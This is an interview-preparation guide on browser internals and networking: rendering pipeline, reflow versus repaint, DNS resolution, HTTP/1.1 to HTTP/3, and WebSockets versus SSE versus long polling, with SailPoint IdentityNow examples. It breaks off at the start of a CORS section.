# Browser Internals, Networking & Architecture
## Framework-Agnostic Front-End Concepts

> **Target Role:** Principal/Staff Front End Engineer
> **Focus:** Browser APIs, Networking, Performance, Security, Architecture - Framework-Agnostic

---

## Table of Contents

1. [Browser Fundamentals & Rendering](#1-browser-fundamentals--rendering)
2. [Networking & Protocols](#2-networking--protocols)
3. [Web APIs & Browser Features](#3-web-apis--browser-features)
4. [Web Security](#4-web-security)
5. [Performance & Optimization](#5-performance--optimization)
6. [Modern Web Architecture](#6-modern-web-architecture)
7. [Build Tools & Module Systems](#7-build-tools--module-systems)
8. [Progressive Web Apps (PWA)](#8-progressive-web-apps-pwa)
9. [Accessibility & Standards](#9-accessibility--standards)
10. [System Design Patterns](#10-system-design-patterns)

---

## 1. Browser Fundamentals & Rendering

### Q1.1: Explain the Critical Rendering Path in detail

**Architect-Level Answer:**

The Critical Rendering Path (CRP) is the sequence of steps browsers take to convert HTML, CSS, and JavaScript into pixels on screen.

**The 6 Steps:**

```
1. DOM Construction (HTML → DOM Tree)
   ↓
2. CSSOM Construction (CSS → CSSOM Tree)
   ↓
3. Render Tree Construction (DOM + CSSOM → Render Tree)
   ↓
4. Layout (Calculate positions and sizes)
   ↓
5. Paint (Fill in pixels)
   ↓
6. Composite (Layer composition for GPU)
```

**Detailed Breakdown:**

```html
<!-- Example HTML -->
<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="header">
    <h1>Identity Dashboard</h1>
  </div>
  <script src="app.js"></script>
</body>
</html>
```

**Step 1: DOM Construction**
```
Browser receives HTML bytes → Converts to characters → Tokenizes → Creates nodes → Builds DOM tree

Bytes: 3C 68 74 6D 6C 3E...
  ↓
Characters: <html><head>...
  ↓
Tokens: StartTag:html, StartTag:head, StartTag:link...
  ↓
Nodes: HTMLHtmlElement, HTMLHeadElement...
  ↓
DOM Tree:
  html
    ├── head
    │   └── link (styles.css)
    └── body
        ├── div.header
        │   └── h1 ("Identity Dashboard")
        └── script (app.js)
```

**Step 2: CSSOM Construction**
```css
/* styles.css */
body { font-size: 16px; }
.header { background: #003d5c; padding: 20px; }
h1 { color: white; font-size: 24px; }
```

```
CSS bytes → Characters → Tokens → Nodes → CSSOM Tree

CSSOM Tree:
  body (font-size: 16px)
    └── .header (background: #003d5c, padding: 20px)
        └── h1 (color: white, font-size: 24px, inherits font-size)
```

**Step 3: Render Tree Construction**
```
DOM + CSSOM = Render Tree (only visible nodes)

Render Tree:
  body
    └── div.header (background: #003d5c, padding: 20px)
        └── h1 (color: white, font-size: 24px)

Note: <head>, <script>, display:none elements are NOT in render tree
```

**Step 4: Layout (Reflow)**
```
Calculate exact position and size of each node

div.header:
  x: 0, y: 0
  width: 100% (viewport width)
  height: 64px (content + padding)

h1:
  x: 20px (padding-left)
  y: 20px (padding-top)
  width: calc(100% - 40px)
  height: 24px
```

**Step 5: Paint**
```
Fill in pixels for each element
- Background colors
- Borders
- Shadows
- Text
- Images

Creates paint records (display lists) for each layer
```

**Step 6: Composite**
```
Combine layers in correct order
GPU accelerated properties:
  - transform
  - opacity
  - filter
  - will-change

Final image sent to screen
```

**Render-Blocking Resources:**

```html
<!-- ❌ Blocks rendering until CSS loads -->
<link rel="stylesheet" href="styles.css">

<!-- ❌ Blocks parsing and rendering -->
<script src="app.js"></script>

<!-- ✅ Doesn't block rendering -->
<script src="app.js" async></script>

<!-- ✅ Doesn't block rendering, executes in order after parsing -->
<script src="app.js" defer></script>

<!-- ✅ Non-critical CSS loaded asynchronously -->
<link rel="preload" href="styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
```

**Optimization Strategies:**

```html
<!-- 1. Minimize Critical Resources -->
<style>
  /* Inline critical CSS */
  .header { background: #003d5c; }
</style>
<link rel="stylesheet" href="non-critical.css" media="print" onload="this.media='all'">

<!-- 2. Minimize Critical Bytes -->
<!-- Use minified CSS/JS, compress images -->

<!-- 3. Minimize Critical Path Length -->
<!-- Reduce number of roundtrips: inline critical resources, use HTTP/2 -->

<!-- 4. Prioritize Visible Content -->
<link rel="preload" href="hero-image.jpg" as="image">
<link rel="dns-prefetch" href="//api.sailpoint.com">
<link rel="preconnect" href="//api.sailpoint.com">
```

**Measuring CRP:**

```javascript
// Performance API
const perfData = performance.getEntriesByType('navigation')[0];

console.log('DOM Content Loaded:', perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart);
console.log('Load Complete:', perfData.loadEventEnd - perfData.loadEventStart);
console.log('DOM Interactive:', perfData.domInteractive);

// Paint Timing API
const paintMetrics = performance.getEntriesByType('paint');
paintMetrics.forEach(metric => {
  console.log(`${metric.name}: ${metric.startTime}ms`);
});
// first-paint: 300ms
// first-contentful-paint: 450ms
```

**SailPoint Context:** In IdentityNow's dashboard, optimizing CRP is critical:
- Inline critical CSS for identity cards above the fold
- Defer non-critical JavaScript (analytics, chat widgets)
- Preload identity data API calls
- Use resource hints for CDN assets

---

### Q1.2: How does browser rendering work? Explain Layout, Paint, and Composite layers

**Architect-Level Answer:**

**The Rendering Pipeline:**

```
JavaScript → Style → Layout → Paint → Composite
    ↓         ↓        ↓        ↓         ↓
  (JS)     (Recalc)  (Reflow) (Raster) (Layers)
```

**1. JavaScript Execution**
```javascript
// Triggers style recalculation
element.classList.add('active');

// Triggers layout (reflow)
element.style.width = '500px';
const height = element.offsetHeight; // Forces synchronous layout

// Triggers paint
element.style.backgroundColor = 'red';

// Triggers composite only (GPU accelerated)
element.style.transform = 'translateX(100px)';
element.style.opacity = 0.5;
```

**2. Style Calculation**
```
Browser recalculates computed styles for affected elements
- Matches CSS selectors
- Resolves cascading and inheritance
- Computes final values

Cost: O(n) where n = number of affected elements
```

**3. Layout (Reflow)**
```
Calculates geometry (position, size) of elements

Triggers:
- Changing width, height, margin, padding, border
- Adding/removing elements
- Changing font-size
- Changing content (text)
- Window resize
- Reading layout properties (offsetHeight, scrollTop, getComputedStyle)

Cost: Expensive! Can affect entire document tree
```

**Layout Thrashing Example:**

```javascript
// ❌ BAD: Causes multiple forced synchronous layouts
for (let i = 0; i < elements.length; i++) {
  const height = elements[i].offsetHeight; // Read (forces layout)
  elements[i].style.height = height + 10 + 'px'; // Write (invalidates layout)
}
// Layout → Read → Layout → Read → Layout...

// ✅ GOOD: Batch reads, then batch writes
const heights = [];
for (let i = 0; i < elements.length; i++) {
  heights.push(elements[i].offsetHeight); // Batch reads
}
for (let i = 0; i < elements.length; i++) {
  elements[i].style.height = heights[i] + 10 + 'px'; // Batch writes
}
// Layout once → Read all → Write all
```

**4. Paint**
```
Fills in pixels for visual parts of elements
- Text
- Colors
- Images
- Borders
- Shadows

Creates paint records (display lists)

Triggers:
- Changing color, background, box-shadow
- Changing visibility
- Adding/removing text

Cost: Moderate, depends on painted area
```

**5. Composite**
```
Combines painted layers in correct order
GPU accelerated

Layers created for:
- Elements with 3D transforms
- Elements with will-change
- <video>, <canvas>, <iframe>
- Elements with CSS filters
- Elements with opacity animations

Triggers:
- transform
- opacity
- filter
- will-change

Cost: Cheap! GPU handles it
```

**Layer Promotion:**

```css
/* ❌ Creates unnecessary layer, wastes memory */
.element {
  will-change: transform, opacity, top, left, color, background;
}

/* ✅ Promote to layer for smooth animation */
.animated-card {
  will-change: transform;
  /* Remove after animation */
}

/* ✅ Implicit layer promotion */
.gpu-accelerated {
  transform: translateZ(0); /* Hack to force layer */
  backface-visibility: hidden; /* Another hack */
}
```

**Performance Comparison:**

```javascript
// ❌ WORST: Triggers Layout + Paint + Composite
element.style.width = '500px';
element.style.height = '300px';
// ~16ms (can drop frames at 60fps)

// ⚠️ MODERATE: Triggers Paint + Composite
element.style.backgroundColor = 'red';
// ~4ms

// ✅ BEST: Triggers Composite only
element.style.transform = 'scale(1.2)';
element.style.opacity = 0.8;
// ~1ms (GPU accelerated)
```

**Debugging Rendering Performance:**

```javascript
// Chrome DevTools Performance tab
// 1. Record interaction
// 2. Look for:
//    - Long yellow bars (JavaScript)
//    - Purple bars (Layout/Reflow)
//    - Green bars (Paint)
//    - Orange bars (Composite)

// Enable paint flashing
// DevTools → More tools → Rendering → Paint flashing

// Enable layer borders
// DevTools → More tools → Rendering → Layer borders
```

**CSS Triggers Reference:**

| Property | Layout | Paint | Composite |
|----------|:------:|:-----:|:---------:|
| width, height, margin, padding | ✓ | ✓ | ✓ |
| color, background, box-shadow | ✗ | ✓ | ✓ |
| transform, opacity | ✗ | ✗ | ✓ |

**SailPoint Context:** In IdentityNow's certification review UI:
- Use `transform` for card animations (not `left`/`top`)
- Batch DOM reads/writes when rendering 1000+ identity rows
- Promote frequently animated elements to layers
- Avoid layout thrashing in infinite scroll implementations

---

### Q1.3: What is the difference between Reflow and Repaint?

**Architect-Level Answer:**

**Reflow (Layout):**
- Recalculates positions and dimensions of elements
- Affects layout geometry
- Most expensive operation
- Can cascade to parent/child elements

**Repaint (Paint):**
- Updates visual appearance without changing layout
- Affects pixels, not geometry
- Less expensive than reflow
- Doesn't affect other elements' positions

**Comparison:**

```javascript
// REFLOW (expensive)
element.style.width = '500px';        // Changes geometry
element.style.display = 'block';      // Changes layout
element.classList.add('wider');       // If class changes width
element.appendChild(newElement);      // Adds to DOM
element.innerHTML = '<div>New</div>'; // Replaces content

// REPAINT (moderate)
element.style.color = 'red';          // Visual only
element.style.backgroundColor = 'blue'; // Visual only
element.style.visibility = 'hidden';  // Visual only (vs display:none)
element.style.boxShadow = '0 2px 4px rgba(0,0,0,0.1)';

// COMPOSITE ONLY (cheap)
element.style.transform = 'translateX(100px)'; // GPU
element.style.opacity = 0.5;          // GPU
```

**Properties that trigger Reflow:**

```
Geometry:
- width, height
- margin, padding, border
- top, left, right, bottom (positioned elements)
- min-width, max-width, min-height, max-height

Layout:
- display
- position
- float, clear
- flex properties (flex-grow, flex-basis, etc.)
- grid properties

Content:
- font-size, font-family, font-weight
- line-height, text-align
- white-space, word-wrap
- overflow

Reading layout properties (forces synchronous reflow):
- offsetWidth, offsetHeight, offsetTop, offsetLeft
- scrollTop, scrollLeft, scrollWidth, scrollHeight
- clientWidth, clientHeight, clientTop, clientLeft
- getComputedStyle()
- getBoundingClientRect()
```

**Properties that trigger Repaint only:**

```
Visual:
- color
- background, background-color, background-image
- border-color, border-style
- box-shadow
- outline, outline-color
- visibility
- text-decoration
```

**Properties that trigger Composite only:**

```
GPU-accelerated:
- transform (translate, rotate, scale, skew)
- opacity
- filter
- will-change
```

**Minimizing Reflows:**

```javascript
// ❌ BAD: Multiple reflows
element.style.width = '100px';  // Reflow
element.style.height = '100px'; // Reflow
element.style.margin = '10px';  // Reflow

// ✅ GOOD: Single reflow with cssText
element.style.cssText = 'width:100px; height:100px; margin:10px;';

// ✅ GOOD: Single reflow with class
element.className = 'resized'; // One reflow

// ❌ BAD: Reading layout property in loop
for (let i = 0; i < 1000; i++) {
  const width = element.offsetWidth; // Forces reflow each iteration!
  doSomething(width);
}

// ✅ GOOD: Cache layout property
const width = element.offsetWidth; // One reflow
for (let i = 0; i < 1000; i++) {
  doSomething(width);
}

// ❌ BAD: Interleaved reads and writes
element.style.width = '100px';     // Write
const height = element.offsetHeight; // Read (forces reflow)
element.style.height = height + 'px'; // Write
const width = element.offsetWidth;   // Read (forces reflow)

// ✅ GOOD: Batch reads, then batch writes
const height = element.offsetHeight; // Read
const width = element.offsetWidth;   // Read
element.style.width = '100px';       // Write
element.style.height = height + 'px'; // Write
```

**Document Fragment for Batch DOM Updates:**

```javascript
// ❌ BAD: 1000 reflows
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Identity ${i}`;
  container.appendChild(div); // Reflow each time!
}

// ✅ GOOD: 1 reflow
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Identity ${i}`;
  fragment.appendChild(div); // No reflow (not in DOM yet)
}
container.appendChild(fragment); // Single reflow

// ✅ ALTERNATIVE: Build HTML string
const html = Array.from({ length: 1000 }, (_, i) => 
  `<div>Identity ${i}</div>`
).join('');
container.innerHTML = html; // Single reflow
```

**Hiding Elements During Batch Updates:**

```javascript
// ✅ Hide element during complex updates
element.style.display = 'none'; // Reflow
// ... make 100 changes ...
element.style.display = 'block'; // Reflow
// Total: 2 reflows instead of 100

// ✅ ALTERNATIVE: Clone, modify, replace
const clone = element.cloneNode(true);
// ... modify clone (not in DOM, no reflows) ...
element.parentNode.replaceChild(clone, element); // Single reflow
```

**SailPoint Context:** When rendering certification campaigns with thousands of items:
- Use DocumentFragment for batch rendering
- Cache layout reads before loops
- Hide container during bulk updates
- Use virtual scrolling to limit DOM nodes

---

## 2. Networking & Protocols

### Q2.1: Explain DNS resolution process in detail

**Architect-Level Answer:**

DNS (Domain Name System) translates human-readable domain names to IP addresses.

**DNS Resolution Steps:**

```
User types: https://identitynow.sailpoint.com
    ↓
1. Browser Cache (check local cache)
    ↓ (miss)
2. OS Cache (check operating system cache)
    ↓ (miss)
3. Router Cache (check router/gateway cache)
    ↓ (miss)
4. ISP DNS Resolver (Recursive Resolver)
    ↓
5. Root Name Server (. → returns .com TLD server)
    ↓
6. TLD Name Server (.com → returns sailpoint.com authoritative server)
    ↓
7. Authoritative Name Server (sailpoint.com → returns IP: 52.1.2.3)
    ↓
8. Response cached at each level
    ↓
9. Browser connects to 52.1.2.3
```

**Detailed Breakdown:**

```
Step 1: Browser Cache
- Chrome: chrome://net-internals/#dns
- TTL: Typically 60 seconds
- Fastest lookup (~0ms)

Step 2: OS Cache
- Windows: ipconfig /displaydns
- macOS/Linux: dscacheutil -cachedump -entries Host
- TTL: Varies by OS
- Lookup time: ~1ms

Step 3: Router Cache
- Most home routers cache DNS
- TTL: Configured by router
- Lookup time: ~5-10ms

Step 4-7: Recursive Resolution
- ISP DNS Resolver queries hierarchy
- Root → TLD → Authoritative
- Cold lookup: 20-120ms
- Warm lookup (cached): 1-5ms
```

**DNS Record Types:**

```
A Record: Domain → IPv4
  identitynow.sailpoint.com → 52.1.2.3

AAAA Record: Domain → IPv6
  identitynow.sailpoint.com → 2001:0db8:85a3::8a2e:0370:7334

CNAME Record: Alias → Canonical name
  www.sailpoint.com → sailpoint.com

MX Record: Mail server
  sailpoint.com → mail.sailpoint.com (priority: 10)

TXT Record: Text data (SPF, DKIM, verification)
  sailpoint.com → "v=spf1 include:_spf.google.com ~all"

NS Record: Name servers
  sailpoint.com → ns1.awsdns.com, ns2.awsdns.com

SOA Record: Start of Authority (zone info)
  Primary NS, admin email, serial, refresh, retry, expire, TTL
```

**DNS Optimization Techniques:**

```html
<!-- 1. DNS Prefetch: Resolve DNS early -->
<link rel="dns-prefetch" href="//api.sailpoint.com">
<link rel="dns-prefetch" href="//cdn.sailpoint.com">
<link rel="dns-prefetch" href="//analytics.google.com">

<!-- 2. Preconnect: DNS + TCP + TLS handshake -->
<link rel="preconnect" href="//api.sailpoint.com">
<link rel="preconnect" href="//fonts.googleapis.com" crossorigin>

<!-- 3. Prefetch: Download resource for next navigation -->
<link rel="prefetch" href="/dashboard">

<!-- 4. Preload: High-priority resource for current page -->
<link rel="preload" href="/critical.css" as="style">
<link rel="preload" href="/hero.jpg" as="image">
```

**DNS Performance Impact:**

```javascript
// Measure DNS lookup time
const perfData = performance.getEntriesByType('navigation')[0];
console.log('DNS Lookup:', perfData.domainLookupEnd - perfData.domainLookupStart);

// Typical times:
// Cold DNS lookup: 20-120ms
// Warm DNS lookup (cached): 0-5ms
// With dns-prefetch: 0ms (already resolved)
```

**DNS Caching Strategy:**

```
Browser Cache: 60s (not configurable)
OS Cache: Respects TTL from DNS server
DNS Server TTL: Configured in DNS records

Example TTL values:
- Static content CDN: 86400s (24 hours)
- API endpoints: 300s (5 minutes)
- Frequently changing: 60s (1 minute)
- Load balancer: 30s (for quick failover)
```

**DNS Security:**

```
DNSSEC (DNS Security Extensions):
- Cryptographically signs DNS records
- Prevents DNS spoofing/cache poisoning
- Validates authenticity of DNS responses

DNS over HTTPS (DoH):
- Encrypts DNS queries
- Prevents ISP snooping
- Uses HTTPS (port 443)
- Supported by modern browsers

DNS over TLS (DoT):
- Encrypts DNS queries
- Uses dedicated port 853
- More efficient than DoH
```

**Common DNS Issues:**

```javascript
// 1. DNS propagation delay
// After changing DNS records, wait for TTL to expire globally
// Can take 24-48 hours for full propagation

// 2. DNS cache poisoning
// Attacker injects false DNS records
// Mitigation: Use DNSSEC, DoH/DoT

// 3. DNS amplification attack (DDoS)
// Attacker uses DNS servers to amplify traffic
// Mitigation: Rate limiting, response rate limiting (RRL)

// 4. Stale DNS cache
// Clear browser cache: chrome://net-internals/#dns → Clear host cache
// Clear OS cache: 
//   Windows: ipconfig /flushdns
//   macOS: sudo dscacheutil -flushcache
//   Linux: sudo systemd-resolve --flush-caches
```

**SailPoint Context:** IdentityNow uses multiple subdomains:
- `identitynow.sailpoint.com` - Main app
- `api.identitynow.sailpoint.com` - API gateway
- `cdn.identitynow.sailpoint.com` - Static assets

Use `dns-prefetch` for all subdomains to reduce latency on initial load.

---

### Q2.2: HTTP/1.1 vs HTTP/2 vs HTTP/3 - What are the key differences?

**Architect-Level Answer:**

**HTTP/1.1 (1997)**

```
Characteristics:
- Text-based protocol
- One request per TCP connection (or sequential with keep-alive)
- Head-of-line blocking
- No multiplexing
- No header compression
- Requires multiple connections for parallelism (6-8 per domain)

Connection:
  Client → Server: GET /api/identities HTTP/1.1
  Server → Client: HTTP/1.1 200 OK
  
  Sequential requests on same connection:
  Request 1 → Response 1 → Request 2 → Response 2
```

**Limitations:**

```javascript
// ❌ HTTP/1.1 Problems:

// 1. Head-of-line blocking
// If first request is slow, all subsequent requests wait
GET /slow-api (5 seconds)
GET /fast-api (blocked, waits 5 seconds)

// 2. Multiple connections needed
// Browser opens 6-8 connections per domain
// Each connection: TCP handshake + TLS handshake = ~100ms overhead

// 3. Redundant headers
// Every request sends full headers (cookies, user-agent, etc.)
GET /api/users
Host: api.sailpoint.com
User-Agent: Mozilla/5.0...
Cookie: session=abc123; token=xyz789; ...
Accept: application/json
// ~500-1000 bytes of headers per request!

// 4. No server push
// Server can't proactively send resources
```

**HTTP/2 (2015)**

```
Characteristics:
- Binary protocol (not text)
- Multiplexing: Multiple requests over single TCP connection
- Header compression (HPACK)
- Server push
- Stream prioritization
- Backward compatible (falls back to HTTP/1.1)

Connection:
  Single TCP connection
    ├── Stream 1: GET /api/identities
    ├── Stream 2: GET /api/entitlements
    ├── Stream 3: GET /api/roles
    └── Stream 4: GET /styles.css
  All streams multiplexed, no blocking!
```

**HTTP/2 Features:**

```javascript
// ✅ HTTP/2 Benefits:

// 1. Multiplexing: No head-of-line blocking at HTTP level
// All requests/responses interleaved on single connection
GET /slow-api (5 seconds) ─┐
GET /fast-api (100ms)      ├─→ Both sent simultaneously
GET /another-api (200ms)   ┘    Fast ones return first!

// 2. Header compression (HPACK)
// First request:
GET /api/users
:method: GET
:path: /api/users
:authority: api.sailpoint.com
user-agent: Mozilla/5.0...
cookie: session=abc123...
// ~1000 bytes

// Subsequent requests (only differences sent):
GET /api/roles
:path: /api/roles  // Only changed header!
// ~50 bytes (95% reduction!)

// 3. Server Push
// Server proactively sends resources
Client requests: GET /index.html
Server responds: 
  - index.html
  - PUSH: styles.css (before client requests it!)
  - PUSH: app.js
  - PUSH: logo.png

// 4. Stream Prioritization
// Critical resources loaded first
Stream 1: /critical.css (weight: 256, priority: high)
Stream 2: /app.js (weight: 128, priority: medium)
Stream 3: /analytics.js (weight: 64, priority: low)
```

**HTTP/2 Limitations:**

```
Still has TCP head-of-line blocking:
- If TCP packet is lost, ALL streams wait for retransmission
- TCP doesn't know about HTTP/2 streams
- Packet loss = entire connection stalls

Example:
  Stream 1: [Packet 1] [Packet 2] [Packet 3]
  Stream 2: [Packet 4] [Packet 5] [Packet 6]
  
  If Packet 2 is lost:
  - Packet 3, 4, 5, 6 all wait (even though they arrived!)
  - TCP must retransmit Packet 2 before delivering others
```

**HTTP/3 (2022) - QUIC Protocol**

```
Characteristics:
- Built on UDP (not TCP!)
- No head-of-line blocking at transport layer
- 0-RTT connection establishment (with session resumption)
- Built-in encryption (TLS 1.3)
- Connection migration (survives IP changes)
- Improved congestion control

Connection:
  UDP-based QUIC connection
    ├── Stream 1: GET /api/identities (independent)
    ├── Stream 2: GET /api/entitlements (independent)
    └── Stream 3: GET /api/roles (independent)
  
  Packet loss in Stream 1 doesn't affect Stream 2 or 3!
```

**HTTP/3 Advantages:**

```javascript
// ✅ HTTP/3 Benefits:

// 1. No TCP head-of-line blocking
// Each stream is independent at transport layer
Stream 1: [Packet 1] [LOST] [Packet 3]
Stream 2: [Packet 4] [Packet 5] [Packet 6]
// Stream 2 continues unaffected by Stream 1's packet loss!

// 2. Faster connection establishment
// HTTP/1.1 & HTTP/2:
TCP handshake (1 RTT) + TLS handshake (1-2 RTT) = 2-3 RTT
// ~150-300ms on high-latency connections

// HTTP/3 (first connection):
QUIC handshake + TLS 1.3 = 1 RTT
// ~50-100ms

// HTTP/3 (resumption):
0-RTT (sends data immediately!)
// ~0ms

// 3. Connection migration
// Mobile user switches from WiFi to cellular
// HTTP/1.1 & HTTP/2: Connection drops, must reconnect
// HTTP/3: Connection survives (uses connection ID, not IP)

// 4. Better performance on lossy networks
// 1% packet loss:
// HTTP/2: ~40% throughput reduction
// HTTP/3: ~10% throughput reduction
```

**Comparison Table:**

| Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---------|----------|--------|--------|
| Protocol | Text | Binary | Binary |
| Transport | TCP | TCP | QUIC (UDP) |
| Multiplexing | ❌ | ✅ | ✅ |
| Header Compression | ❌ | ✅ (HPACK) | ✅ (QPACK) |
| Server Push | ❌ | ✅ | ✅ |
| HOL Blocking | ✅ (HTTP & TCP) | ⚠️ (TCP only) | ❌ |
| Connection Setup | 2-3 RTT | 2-3 RTT | 1 RTT (0-RTT resume) |
| Connection Migration | ❌ | ❌ | ✅ |
| Encryption | Optional | Optional | Mandatory |
| Browser Support | 100% | ~98% | ~75% (growing) |

**Detecting HTTP Version:**

```javascript
// Check HTTP version in browser
fetch('https://api.sailpoint.com/v3/identities')
  .then(response => {
    console.log('HTTP Version:', response.headers.get('x-http-version'));
  });

// Chrome DevTools: Network tab → Protocol column
// h2 = HTTP/2
// h3 = HTTP/3
// http/1.1 = HTTP/1.1

// Performance API
const perfEntry = performance.getEntriesByType('navigation')[0];
console.log('Next Hop Protocol:', perfEntry.nextHopProtocol);
// "h2" or "h3" or "http/1.1"
```

**When to Use Each:**

```
HTTP/1.1:
- Legacy systems
- Simple static sites
- No HTTPS available

HTTP/2:
- Modern web apps (default choice)
- HTTPS required
- Multiplexing benefits
- Widely supported

HTTP/3:
- High-latency networks (mobile, satellite)
- Lossy networks (poor WiFi, cellular)
- Real-time applications
- Mobile apps (connection migration)
- Requires HTTPS
```

**SailPoint Context:** IdentityNow should use:
- HTTP/2 for main application (wide browser support)
- HTTP/3 for mobile app (connection migration, 0-RTT)
- Fallback to HTTP/1.1 for legacy enterprise browsers

---

### Q2.3: Explain WebSockets vs Server-Sent Events (SSE) vs Long Polling

**Architect-Level Answer:**

**1. Long Polling (Legacy)**

```javascript
// Client repeatedly requests server for updates
async function longPoll() {
  while (true) {
    try {
      const response = await fetch('/api/notifications?timeout=30');
      const data = await response.json();
      
      if (data.notifications.length > 0) {
        handleNotifications(data.notifications);
      }
      
      // Immediately poll again
      await longPoll();
    } catch (error) {
      // Wait before retrying
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

longPoll();
```

**Characteristics:**
```
- Client sends request
- Server holds connection open until data available (or timeout)
- Server responds with data
- Client immediately sends new request
- Simulates real-time with HTTP

Pros:
✅ Works with any HTTP server
✅ Firewall/proxy friendly
✅ Automatic reconnection

Cons:
❌ High overhead (HTTP headers on every request)
❌ Latency (request → response cycle)
❌ Server resource intensive
❌ Not truly real-time
```

**2. Server-Sent Events (SSE)**

```javascript
// Server pushes updates to client over single HTTP connection
const eventSource = new EventSource('/api/notifications/stream');

// Listen for messages
eventSource.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log('Notification:', data);
};

// Listen for specific event types
eventSource.addEventListener('certification-update', (event) => {
  const data = JSON.parse(event.data);
  updateCertificationUI(data);
});

// Handle errors
eventSource.onerror = (error) => {
  console.error('SSE Error:', error);
  // EventSource automatically reconnects!
};

// Close connection
eventSource.close();
```

**Server-side (Node.js):**
```javascript
app.get('/api/notifications/stream', (req, res) => {
  // Set SSE headers
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  
  // Send initial data
  res.write('data: {"message": "Connected"}\n\n');
  
  // Send updates periodically
  const intervalId = setInterval(() => {
    const notification = getLatestNotification();
    res.write(`event: certification-update\n`);
    res.write(`data: ${JSON.stringify(notification)}\n`);
    res.write(`id: ${notification.id}\n\n`);
  }, 5000);
  
  // Cleanup on disconnect
  req.on('close', () => {
    clearInterval(intervalId);
  });
});
```

**SSE Message Format:**
```
event: certification-update
id: 12345
retry: 10000
data: {"certId": "cert-001", "status": "approved"}
data: {"timestamp": "2024-01-15T10:30:00Z"}

(blank line indicates end of message)
```

**Characteristics:**
```
- Unidirectional: Server → Client only
- Built on HTTP (uses standard HTTP connection)
- Automatic reconnection with last event ID
- Text-based protocol
- UTF-8 encoding only

Pros:
✅ Simple API (EventSource)
✅ Automatic reconnection
✅ Event IDs for resuming
✅ Works over HTTP/1.1, HTTP/2
✅ Firewall/proxy friendly
✅ Lower overhead than long polling
✅ Built-in retry mechanism

Cons:
❌ Unidirectional (can't send from client)
❌ Text only (no binary)
❌ Limited browser connections (6 per domain in HTTP/1.1)
❌ No built-in compression
```

**3. WebSockets**

```javascript
// Bidirectional, full-duplex communication
const ws = new WebSocket('wss://api.sailpoint.com/notifications');

// Connection opened
ws.onopen = () => {
  console.log('WebSocket connected');
  
  // Send data to server
  ws.send(JSON.stringify({
    type: 'subscribe',
    channels: ['certifications', 'access-requests']
  }));
};

// Receive messages
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log('Received:', data);
  
  // Send acknowledgment
  ws.send(JSON.stringify({
    type: 'ack',
    messageId: data.id
  }));
};

// Handle errors
ws.onerror = (error) => {
  console.error('WebSocket error:', error);
};

// Connection closed
ws.onclose = (event) => {
  console.log('WebSocket closed:', event.code, event.reason);
  
  // Manual reconnection logic
  setTimeout(() => {
    connectWebSocket();
  }, 5000);
};

// Send binary data
const buffer = new ArrayBuffer(8);
ws.send(buffer);

// Close connection
ws.close(1000, 'Normal closure');
```

**WebSocket Handshake:**
```
Client → Server (HTTP Upgrade):
GET /notifications HTTP/1.1
Host: api.sailpoint.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

Server → Client:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

(Connection upgraded to WebSocket protocol)
```

**Characteristics:**
```
- Bidirectional: Client ↔ Server
- Full-duplex: Both can send simultaneously
- Binary and text data
- Low overhead (2-14 bytes per frame)
- Custom protocol (not HTTP after handshake)

Pros:
✅ True real-time, low latency
✅ Bidirectional communication
✅ Binary data support
✅ Low overhead
✅ No connection limits
✅ Can use compression (permessage-deflate)

Cons:
❌ More complex to implement
❌ No automatic reconnection
❌ Requires WebSocket-aware proxies/firewalls
❌ Stateful (harder to scale)
❌ Manual heartbeat/ping-pong needed
```

**Comparison Table:**

| Feature | Long Polling | SSE | WebSocket |
|---------|-------------|-----|-----------|
| Direction | Client → Server | Server → Client | Bidirectional |
| Protocol | HTTP | HTTP | WebSocket (ws://) |
| Data Format | Any | Text (UTF-8) | Text + Binary |
| Overhead | High | Medium | Low |
| Latency | High (~100-500ms) | Low (~10-50ms) | Very Low (~1-10ms) |
| Reconnection | Manual | Automatic | Manual |
| Browser Support | 100% | 98% | 98% |
| Firewall Friendly | ✅ | ✅ | ⚠️ |
| Scalability | Poor | Good | Excellent |
| Complexity | Low | Low | High |

**When to Use Each:**

```javascript
// Use LONG POLLING when:
// - Legacy browser support required
// - Simple notifications
// - Low frequency updates
// Example: Check for new messages every 30 seconds

// Use SSE when:
// - Server → Client updates only
// - Real-time notifications
// - Live feeds, dashboards
// - Automatic reconnection needed
// Example: IdentityNow certification status updates

// Use WEBSOCKETS when:
// - Bidirectional communication required
// - Real-time collaboration
// - Gaming, chat applications
// - High-frequency updates
// - Binary data (file uploads, video)
// Example: IdentityNow live identity provisioning status
```

**SailPoint Context:**

```javascript
// IdentityNow Real-time Updates Architecture

// SSE for certification campaign updates (server → client)
const certUpdates = new EventSource('/api/certifications/stream');
certUpdates.addEventListener('status-change', (event) => {
  updateCertificationCard(JSON.parse(event.data));
});

// WebSocket for provisioning operations (bidirectional)
const provisioningWS = new WebSocket('wss://api.sailpoint.com/provisioning');
provisioningWS.onmessage = (event) => {
  const status = JSON.parse(event.data);
  updateProvisioningStatus(status);
};

// Send provisioning command
provisioningWS.send(JSON.stringify({
  action: 'provision',
  identityId: 'id-123',
  entitlements: ['ent-001', 'ent-002']
}));
```

---

### Q2.4: Explain CORS (Cross-Origin Resource Sharing) in detail

**Architect-Level Answer:**

CORS is a security mechanism that allows servers to specify which origins can access their resources, relaxing the Same-Origin Policy.

**Same-Origin Policy (SOP):**

```javascript
// Origin = Protocol + Domain + Port

// Same origin:
https://identitynow.sailpoint.com:443/dashboard
https://identitynow.sailpoint.com:443/api/users
// ✅ Same: https, identitynow.sailpoint.com, 443

// Different origins:
https://identitynow.sailpoint.com → http://identitynow.sailpoint.com
// ❌ Different protocol

